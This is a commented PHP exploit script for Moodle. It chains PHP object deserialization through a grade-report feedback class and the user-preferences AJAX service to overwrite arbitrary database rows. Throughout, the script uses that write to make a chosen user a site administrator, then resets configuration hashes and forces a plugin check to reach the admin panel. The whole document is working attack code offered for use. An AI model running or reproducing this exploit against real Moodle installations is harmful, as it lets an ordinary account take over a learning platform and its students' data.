<?php

//defining the required classes for our exploit
namespace gradereport_singleview\local\ui {
    class feedback{   
    }
}

namespace {
    class gradereport_overview_external{
}

class grade_item{
}

class grade_grade{
}


// creating a simple httpPost method which requires php-curl
function httpPost($url, $data, $MoodleSession, $json)
{
    $curl = curl_init($url);
    $headers = array('Cookie: MoodleSession='.$MoodleSession);
    if($json){
        array_push($headers, 'Content-Type: application/json');
    }else{
        $data =  urldecode(http_build_query($data));
    }
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    // curl_setopt($curl, CURLOPT_PROXY, '127.0.0.1:8080'); //un-comment if you wish to use a proxy
    $response = curl_exec($curl);
    curl_close($curl);
    return $response;
}

// creating a simple httpGet method which requires php-curl
function httpGet($url, $MoodleSession)
{
    $curl = curl_init($url);
    $headers = array('Cookie: MoodleSession='.$MoodleSession);
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    // curl_setopt($curl, CURLOPT_PROXY, '127.0.0.1:8080'); //un-comment if you wish to use a proxy
    $response = curl_exec($curl);
    curl_close($curl);
    return $response;
}

function update_table($url, $MoodleSession, $sesskey, $table, $rowId, $column, $value){
    //first we create a gradereport_overview_external object because it is supported by the Moodle autoloader and it includes the grade_grade and grade_item classes that we are going to need
    $base = new gradereport_overview_external();

    // now we create the feedback object which inherits the vulnerable __tostring() method from its parent
    $fb = new gradereport_singleview\local\ui\feedback();

    //filling the feedback object with the required properties for the exploit to work
    $fb -> grade = new grade_grade();
    $fb -> grade -> grade_item = new grade_item();
    $fb -> grade -> grade_item -> calculation = "[[somestring";
    $fb -> grade -> grade_item -> calculation_normalized = false;

    //setting the table which we want to alter
    $fb -> grade -> grade_item -> table = $table;
    //setting the row id of the row that we want to alter
    $fb -> grade -> grade_item -> id = $rowId;
    //setting the column with the value that we want to insert
    $fb -> grade -> grade_item -> $column = $value;
    $fb -> grade -> grade_item -> required_fields = array($column,'id');
    
    //creating the array with our base object (which itself is included in an array because the base object has no __tostring() method) and our payload object
    $arr = array(array($base),$fb);
    
    //serializing the array
    $value = serialize($arr);
    //we'll set the course_blocks sortorder to 0 so we default to legacy user preference
    $data = array('sesskey' => $sesskey, 'sortorder[]' => 0);
    httpPost($url. '/blocks/course_overview/save.php',$data, $MoodleSession,0);

    //injecting the payload
    $data = json_encode(array(array('index'=> 0, 'methodname'=>'core_user_update_user_preferences','args'=>array('preferences'=>array(array('type'=> 'course_overview_course_order', 'value' => $value))))));
    echo $data . "\n\n";
    httpPost($url.'/lib/ajax/service.php?sesskey='.$sesskey, $data, $MoodleSession,1);

    //getting the frontpage so the payload will activate
    httpGet($url.'/my/', $MoodleSession);
    }

$url = 'http://localhost:8000'; //url of the Moodle site
$MoodleSession = '986e153982238a1fd20f30c7235d0400'; //your MoodleSession cookie value
$sesskey = '1qKjwXWwuG'; //your sesskey

$table = "config"; //table to update 
$rowId = 25; // row id to insert into. 25 is the row that sets the 'siteadmins' parameter. could vary from installation to installation
$column = 'value'; //column name to update, which holds the userid
$value = 3; // userid to set as 'siteadmins' Probably want to make it your own
update_table($url, $MoodleSession,$sesskey,$table,$rowId,$column, $value);

//reset the allversionshash config entry with a sha1 hash so the site reloads its configuration
$rowId = 374; // row id of 'allversionshash' parameter
update_table($url, $MoodleSession,$sesskey,$table,$rowId, $column, sha1(time()));

//reset the sortorder so we can see the front page again without the payload triggering
$data = array('sesskey' => $sesskey, 'sortorder[]' => 1);
httpPost($url. '/blocks/course_overview/save.php',$data, $MoodleSession,0);

//force plugincheck so we can access admin panel
httpGet($url.'/admin/index.php?cache=0&confirmplugincheck=1',$MoodleSession);

}
?>
